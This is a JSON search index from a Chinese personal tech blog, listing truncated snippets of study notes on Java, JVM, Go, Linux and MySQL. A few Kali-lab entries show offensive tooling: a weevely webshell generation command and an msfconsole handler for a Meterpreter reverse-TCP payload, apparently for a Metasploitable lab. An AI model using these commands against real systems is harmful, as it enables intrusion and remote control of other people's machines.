的文件 用来给 服务端 公网 ip 的运行 有个 frpc 的执行文件 用来给客户端运行 1 2 3 4 5 [common] bind_port = 7000 authentication_method = token token =","lvl0":"frp 内网穿透命令","lvl1":null,"lvl2":"摘要","objectID":"4d153cfd8f12ffb84e657a880ba36642","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"content":"部署的骚操作 [TOC] 总结两大块 ftp使用方法 scp使用方法 ftp 使用总结 ftp 使用教程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ftp ip # 通过 ftp 连接远","lvl0":"ftp命令以及原理","lvl1":null,"lvl2":"摘要","objectID":"8f6577fb86cc46e84b398627f0d4b0dd","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/ftp%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"},{"content":"git 有3个状态 工作区 -\u0026gt; 暂存区 -\u0026gt; 版本库 练习 git 网站 有一个head 指针指向 当前暂存区的节点， 如果我提交新代码到暂存区 就新增加一个节点，内容复制到新节","lvl0":"git学习","lvl1":null,"lvl2":"摘要","objectID":"60717a7db902e54c34b9f0d53cb74c09","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/git%E5%AD%A6%E4%B9%A0/"},{"content":"三色标记法原理 垃圾回收(Garbage Collection，简称GC)是编程语言中提供的自动的内存管理机制，自动释放不需要的对象，让出存储器","lvl0":"golang 垃圾回收机制","lvl1":null,"lvl2":"摘要","objectID":"6f18cc90b24ab0f860571daf2263576e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/golang%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/golang%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"},{"content":"golang 爬虫框架使用","lvl0":"golang爬虫demo","lvl1":null,"lvl2":"摘要","objectID":"b1c2f1fb1bc7970551e9529af6fdc800","tags":["个人总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/golang/golang-%E7%88%AC%E8%99%AB/"},{"content":"参考的文档教程 基础知识和结论 Java使用的是一对一线程模型，所以它的一个线程对应于一个内核线程，调度完全交给操作系统来处理； Go语言使用的是","lvl0":"go语言并发模型","lvl1":null,"lvl2":"摘要","objectID":"8ee2d835952cd44347b162d8615a2fae","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B/"},{"content":"等待唤醒 比如 我 生产者生成的内容满了， 就等待 wait， 消费者没东西消费了 ，就 调用 notifyAll 叫醒 生产者，同时自己调用 wait 睡眠 那我们来看看现实世界里是如何解","lvl0":"Guarded Suspension 等待唤醒机制的规范实现","lvl1":null,"lvl2":"摘要","objectID":"e8f13e68bce911b52e64c20ad81e1d68","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/guarded-suspension/"},{"content":"happen-befores原则 使用 happens-before 在一个 goroutine 内部，程序的执行顺序和它们的代码指定的顺序是一样的，即使编译器 或者 CPU 重排了读写顺序，从行为上来","lvl0":"happen-befores原则","lvl1":null,"lvl2":"摘要","objectID":"8297e0584bb5f7a8dd42ac1c66053995","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/happen-befores%E5%8E%9F%E5%88%99/"},{"content":"hikaricp原理 参考官网文档 HiKariCP 官方网站解释了其性能之所以如此之高的秘密。微观上 HiKariCP 程序编译出的字节码执行效率更高，站在字节码的角度去优化 Java","lvl0":"hikaricp","lvl1":null,"lvl2":"摘要","objectID":"6f39afc639d214a8a444a35349cf5d7f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E6%A1%86%E6%9E%B6%E6%A1%88%E4%BE%8B/hikaricp/"},{"content":"hta_server 漏洞利用","lvl0":"hta_server 漏洞利用","lvl1":null,"lvl2":"摘要","objectID":"3f9e1807ad46b2cf6bfbe79abd52a638","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/hta_server/"},{"content":"hugo github actions 部署配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 name:GitHubPageson:push:branches:- master# Set a branch to deployjobs:deploy:runs-on:ubuntu-18.04steps:- uses:actions/checkout@v2with:submodules:recursive# Fetch Hugo themes (true OR recursive)fetch-depth:0# Fetch all history for .GitInfo and .Lastmod- name:SetupHugouses:peaceiris/actions-hugo@v2with:# hugo-version: \u0026#39;${{ steps.hugo-version.outputs.HUGO_VERSION }}\u0026#39;hugo-version:\u0026#39;0.74.2\u0026#39;# extended: true- name:Buildrun:hugo-D- name:Deployuses:peaceiris/actions-gh-pages@v3with:deploy_key:${{secrets.ACTIONS_DEPLOY_KEY}}external_repository:lyr-2000/lyr-2000.github.iopublish_branch:gh-pagespublish_dir:./public","lvl0":"hugo github actions部署","lvl1":null,"lvl2":"摘要","objectID":"07b93e6f2005ae799798d43968eb9f71","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/hugo-github-actions/"},{"content":"Immutability模式：如何利用不变性解决并发问题？ “多个线程同时读写同一共享变量存在并发问题”，这里的必要条件之一是读写，如果只有读","lvl0":"Immutability模式","lvl1":null,"lvl2":"摘要","objectID":"754d0ee7014a8c52f7b94b2cc138a342","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/immutability%E6%A8%A1%E5%BC%8F/"},{"content":"linux 文件系统相关 像一家公司要做 To B 的生意，发现客户多种多样，众口难调，不同的地域不一样，不同的行业不一样。如果你不懂某个地方的规矩，根本卖不出","lvl0":"IO方面的知识","lvl1":null,"lvl2":"摘要","objectID":"b3724f311b58af53f8b817405db8192d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/io%E6%96%B9%E9%9D%A2%E7%9A%84%E7%9F%A5%E8%AF%86/"},{"content":"springmvc怎么处理json数据 ajax请求 通过 HandlerAdapter 处理 这个 数据，","lvl0":"java spring全家桶","lvl1":null,"lvl2":"摘要","objectID":"982a1978441138e6620ea2c8ed43d014","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java-spring%E5%85%A8%E5%AE%B6%E6%A1%B6/"},{"content":"java 调优工具","lvl0":"JAVA 调优工具","lvl1":null,"lvl2":"摘要","objectID":"9460c41e24bb2e000f25b5ae4d83f70e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/java-%E8%B0%83%E4%BC%98%E5%B7%A5%E5%85%B7/"},{"content":"有什么优化的手段呢？ 字符串拼接用 StringBuilder stringBuffer intern 优化常用字符串 这个案例来自一位 Twitter 工程师在 QCon 全球软件开发大会上的演讲，他们想到的解决方法，就是使用 String.intern 来节","lvl0":"java_优化_字符串优化的方法","lvl1":null,"lvl2":"摘要","objectID":"42f691f9d8baec872e37fdcba4b184bd","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/java_%E4%BC%98%E5%8C%96_%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BC%98%E5%8C%96%E7%9A%84%E6%96%B9%E6%B3%95/"},{"content":"arraylist换成线程安全的copyOnwriteList就可以解决线程不安全问题? copyOnwriteList更适合某一时间段统一新","lvl0":"java_优化_容器优化","lvl1":null,"lvl2":"摘要","objectID":"bd60619b7d9b50ab35b3bff656d1b7e5","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/java_%E4%BC%98%E5%8C%96_%E5%AE%B9%E5%99%A8%E4%BC%98%E5%8C%96/"},{"content":"**在并发编程中，多个线程访问同一个共享资源时，我们必须考虑如何维护数据的原子性。**在 JDK1.5 之前，Java 是依靠 Synchronized 关键字实现锁功能来做到这点的","lvl0":"java_多线程_锁优化","lvl1":null,"lvl2":"摘要","objectID":"01c764b0dad07741da3aaa471a6f73c8","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/java_%E5%A4%9A%E7%BA%BF%E7%A8%8B_%E9%94%81%E4%BC%98%E5%8C%96/"},{"content":"java 八股 垃圾回收 SurvivorRatio 2个survivor 区 和 Eden区的比值，默认值为8，即$ Eden区: From区域:TO 区域 = 8:1:1 $","lvl0":"java八股_垃圾回收","lvl1":null,"lvl2":"摘要","objectID":"c5b73e1721a410b59f69ccc457786a30","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/java/java%E5%85%AB%E8%82%A1%E9%A2%98_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"},{"content":"为什么学习字节码文件 类的结构有几个部分 字节码都有哪些？ java class文件由上面组成 局部变量表 class文件版本号 魔数 【确定当前文件是一个能被虚","lvl0":"java前端编译器","lvl1":null,"lvl2":"摘要","objectID":"4153a772bb252ab575c5e92fda47a451","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/java-%E5%89%8D%E7%AB%AF%E7%BC%96%E8%AF%91%E5%99%A8/"},{"content":"其实在单个处理器的时期，操作系统就能处理多线程并发任务。处理器给每个线程分配 CPU 时间片（Time Slice），线程在分配获得的时间片内执行任务","lvl0":"java多线程上下文切换","lvl1":null,"lvl2":"摘要","objectID":"424e9ed43a640e4b840f103fc853702e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/java_%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98/"},{"content":"java 多线程避免死锁 面向对象思想里面有一个很重要的特性是封装，封装的通俗解释就是将属性和实现细节封装在对象内部，外界对象只能通过目标对象提供的公","lvl0":"java多线程避免死锁","lvl1":null,"lvl2":"摘要","objectID":"e059ac89065c41f3de6aee896acd8117","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/java-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%81%BF%E5%85%8D%E6%AD%BB%E9%94%81%E6%93%8D%E4%BD%9C/"},{"content":"java 并发八股文 面试题网站 线程生命周期 当线程被创建并启动以后，它既不是一启动就进入了执行状态，也不是一直处于执行状态。在线程的生命周期中，它要经","lvl0":"java并发八股","lvl1":null,"lvl2":"摘要","objectID":"8b61d0f9db4f2524e1c9c151c1f9eb1f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/java%E5%B9%B6%E5%8F%91%E5%85%AB%E8%82%A1/"},{"content":"如何防止死锁 tryLock 按经历只获取一个资源，不要同时获取多个资源 尽量按顺序上锁 总结： tryLock 方法 lock方法 lock是无条件阻塞加锁，tryLock 的话是","lvl0":"java并发八股[reentrantLock,查看线程死锁]","lvl1":null,"lvl2":"摘要","objectID":"7c0bef2ae5c284ea24822336db005e20","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/reentrantlock/"},{"content":"并发编程需要解决的问题 从性能角度讲，我们为了提高执行一定计算机任务的效率，所以IO等待的时候不能让cpu闲着，所以我们把任务拆分交替执行，有","lvl0":"java并发编程基础学习","lvl1":null,"lvl2":"摘要","objectID":"fa009f7b2b99a5e51511b75b0a3779f4","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"content":"JMM JMM是什么 JMM是一种规范，目的是解决由于多线程通过共享内存进行通信时，存在的本地内存数据不一致、编译器会对代码指令重排序、处理器会对代","lvl0":"JMM","lvl1":null,"lvl2":"摘要","objectID":"dda1c45e8d482ba2605918e088454170","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/jmm/"},{"content":"什么是 JNI java native interface，api 底层实现是 c 和 c++ java GC root 有哪些 Class Thread ，活着的线程 Stack Local , java 方法的Local变量参数 JNI local Jni Global monitor Used , 用于同步的监","lvl0":"jvm什么时候进行垃圾回收","lvl1":null,"lvl2":"摘要","objectID":"e61654cdc60403c5e491d3b4b7450f79","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/jvm-%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"},{"content":"JMM JMM是什么 JMM是一种规范，目的是解决由于多线程通过共享内存进行通信时，存在的本地内存数据不一致、编译器会对代码指令重排序、处理器会对代","lvl0":"JVM全集","lvl1":null,"lvl2":"摘要","objectID":"a213e95f6b4c9e80b1a2e3e1c707d6df","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/jvm%E5%85%A8%E9%9B%86/"},{"content":"在 Java 语言中，Sun 公司的工程师们对 String 对象做了大量的优化，来节约内存空间，提升 String 对象在系统中的性能。一起来看看优化过程，如下图所示： 工程师将 char[]","lvl0":"jvm编程理论","lvl1":null,"lvl2":"摘要","objectID":"02b1b469dd340f03a7ee4ed6782a9bef","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/jvm%E7%BC%96%E7%A8%8B%E7%90%86%E8%AE%BA/"},{"content":"免责声明： 切勿使用教程中的内容进行违法活动，后果自负 开源，免费，可以给任何人使用 广泛支持无线协议 在安全环境中开发 GPG 签名包和存储库 kali 可以用于各","lvl0":"kali的优势","lvl1":null,"lvl2":"摘要","objectID":"5124a3a03239f69465e5cfe257f71495","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/kali%E5%9F%BA%E7%A1%80/kali%E7%9A%84%E4%BC%98%E5%8A%BF/"},{"content":"1. Linux文件管理 Linux中的所有数据都被保存在文件中，所有的文件被分配到不同的目录。目录是一种类似于树的结构，称为文件系统。 1.1. 文件类型","lvl0":"linux file permission","lvl1":null,"lvl2":"摘要","objectID":"973f096ee53b11a9316587f2e0f93350","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/linix-file-permission/"},{"content":"文件存储结构 大部分的Linux文件系统（如ext2、ext3）规定，一个文件由目录项、inode和数据块组成 目录项：包括文件名和inode节","lvl0":"linux file storage_inode","lvl1":null,"lvl2":"摘要","objectID":"939d14da90f4dd60deddf43d0c3a7482","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/linux_file_storage_inode/"},{"content":"什么是 inode inode包含很多的文件元信息，但不包含文件名，例如：字节数、属主UserID、属组GroupID、读写执行权限、时间戳等。 而文件名","lvl0":"linux inode原理","lvl1":null,"lvl2":"摘要","objectID":"5bb3eb5fca8eb1773579d875374dee31","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/linux_inode%E5%8E%9F%E7%90%86/"},{"content":"weevely 工具教程 参考文档 1 2 3 4 5 6 7 8 git clone git@github.com:epinna/weevely3.git # Make sure that the python package manager and yaml libraries are installed sudo apt-get install -y python3 python3-pip curl cd weevely3/ sudo pip3 install -r requirements.txt --upgrade 生成木马 文件 1 2 3 4 ./weevely.py generate webshell webshell.php # 本地生成 webshell\\ 密码","lvl0":"linux weevely工具","lvl1":["linux"],"lvl2":"摘要","objectID":"2af701549308399943469250e003646c","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/linux%E4%B8%8B%E8%8F%9C%E5%88%80/"},{"content":"linux x86架构 CPU 对于一个计算机来讲，最核心的就是CPU（Central Processing Unit，中央处理器）。这是这台计算机的大脑，所有的设备都围绕它展开。","lvl0":"linux x86架构【linux体系学习】","lvl1":null,"lvl2":"摘要","objectID":"65d7ac154fba067b293871ff3fc74167","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/linux-x86%E6%9E%B6%E6%9E%84/"},{"content":"4. 表内容操作 4.1. 增 1 2 3 4 5 6 insert into 表 (列名,列名...) values (值,值,...) insert into 表 (列名,列名...) values (值,值,...),(值,值,值...","lvl0":"linux下MYSQL crud commands","lvl1":["linux"],"lvl2":"摘要","objectID":"3d91d6a4d87a826ad8ffb57fb974fd57","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/mysql/crud_commands/"},{"content":"2. 数据库操作 1 2 3 4 5 6 7 8 #创建数据库 create database \u0026lt;数据库名\u0026gt; #显示数据库 show databases #删除数据 drop database \u0026lt;数据库名\u0026gt; 3. 数据表操作 3.1. 创建","lvl0":"linux下MYSQL table-operation","lvl1":["linux"],"lvl2":"摘要","objectID":"9b6f812354d3ed0632345d7b9bd97a8f","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/mysql/table-operation/"},{"content":"1. 系统管理 1.1. 连接mysql 格式： mysql -h主机地址 -u用户名 －p用户密码 1 2 3 4 5 6 7 8 #连接本地 mysql -h\u0026lt;localhost/127.0.0.1\u0026gt; -u用户名 －p用户密码 #连接远程 mysql -h\u0026l","lvl0":"linux下MYSQL的管理","lvl1":["linux"],"lvl2":"摘要","objectID":"0eea86097c96d749dfd9249b9e7cf93d","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/mysql/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86/"},{"content":"1 2 3 4 ifconfig :\u0026lt;\u0026lt;EOF eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 EOF 由命令可知： linux下的 MTU 为 1500 个字节 1 2 net.ipv4.tcp_sack = 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ping -s 1460 -M do baidu.com :\u0026lt;\u0026lt;EOF PING baidu.com (220.181.38.148) 1460(1488) bytes of","lvl0":"linux下的MTU","lvl1":["linux"],"lvl2":"摘要","objectID":"ef5fb5185d05b90c40e46b1a4580a609","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/linux%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/linux%E4%B8%8B%E7%9A%84-mtu/"},{"content":"linux 下进程和线程 其实在Linux内核2.4版以前，线程的实现和管理方式就是完全按照进程方式实现的。在2.6版内核以后才有了单独的线程实现。 进程","lvl0":"linux下进程和线程","lvl1":null,"lvl2":"摘要","objectID":"749bbab69bed4f7e55917b2f7555f3e8","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/"},{"content":"进程控制函数 孤儿进程和僵尸进程 经验： 很多时候 我们会让子进程先退出，然后再退出父进程 如果父进程先死亡， 那么 子进程就是孤儿进程【很容易理解】 僵尸","lvl0":"linux下进程控制","lvl1":null,"lvl2":"摘要","objectID":"45db48c563a0eacef854ee7228cdb727","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/linux%E4%B8%8B-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6fork/"},{"content":"学习教程 普通文件（-） 从Linux的角度来说，类似mp4、pdf、html这样应用层面上的文件类型都属于普通文件 Linux用户可以根据访问权","lvl0":"linux分区原理","lvl1":["Linux文件系统原理"],"lvl2":"摘要","objectID":"1d1e9760b5a2255bfb4774629b29d43c","tags":["linux文件系统原理"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/%E5%88%86%E5%8C%BA/"},{"content":"metasploitable2 实验搭建 制作 linux 恶意软件获取 shell 使用 msfvenom 生成 linux 可执行文件 监听 端口 1 2 3 4 5 6 7 8 msfconsole use exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcp set LHOST 192.168.1.53 set LPORT 4444 exploit","lvl0":"linux恶意软件制作","lvl1":null,"lvl2":"摘要","objectID":"6bff8c472f5dbd663edd572aca5203ed","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/linux%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%B6%E4%BD%9C/"},{"content":"虚拟地址空间原理 学习视频 Linux 为每个运行程序（进程） 操作系统都会为其分配一个 0 ~ 4G 的地址空间 (虚拟地址空间) 进程： 正在运行的程序 Linux 下 可执行文件格","lvl0":"linux文件读写API","lvl1":null,"lvl2":"摘要","objectID":"fc9eb4a058493418cb7cc62e2b6ed435","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/linux%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99api/"},{"content":"常见的 调优命令 top uptime","lvl0":"linux调优_系统负载","lvl1":null,"lvl2":"摘要","objectID":"1d955a3101e355908384f14d7357f77f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E8%B0%83%E4%BC%98_%E7%B3%BB%E7%BB%9F%E8%B4%9F%E8%BD%BD/"},{"content":"linux 下部署前端程序总结 上来就删除 yarn.lock, package-lock.json 等文件 yarn 安装依赖 yarn dev 运行 即可 杀端口，自动部署命令等 1 2 3 4 lsof -i :8080 # list open file , 8080 端口的 systemctl status ssh","lvl0":"linux部署前端程序","lvl1":null,"lvl2":"摘要","objectID":"25383a5a7ae75cad343ff4b069c9d367","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E9%83%A8%E7%BD%B2%E5%89%8D%E7%AB%AF-node%E7%A8%8B%E5%BA%8F%E7%AD%89/"},{"content":"LongAdder源码学习 学习视频参考 在 JDK1.8 中，Java 提供了一个新的原子类 LongAdder。LongAdder 在高并发场景下会比 AtomicInteger 和 AtomicLong 的性","lvl0":"LongAdder源码","lvl1":null,"lvl2":"摘要","objectID":"4759eae29c85585b7783c6d1aa2b58cd","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/longadder-%E6%BA%90%E7%A0%81/"},{"content":"lsof 恢复文件 list open file 进程 打开了某个文件，只要进程不死，这个文件处于被打开状态， 这个文件虽然被删除了 我们也可以重新恢复这个文件 如果进程重启了，文件","lvl0":"lsof恢复文件","lvl1":["Linux文件系统原理"],"lvl2":"摘要","objectID":"b16595d9c70af86925244434d213e5d4","tags":["linux文件系统原理"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/lsof%E6%81%A2%E5%A4%8D%E6%96%87%E4%BB%B6/"},{"content":"","lvl0":"makefile原理","lvl1":null,"lvl2":"摘要","objectID":"bb80f6b85d31282d1c2e53a48be30874","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/makefile%E5%8E%9F%E7%90%86/"},{"content":"man的使用方法 1 2 3 4 5 man setfacl # 输入 /EXAMPLE 查找 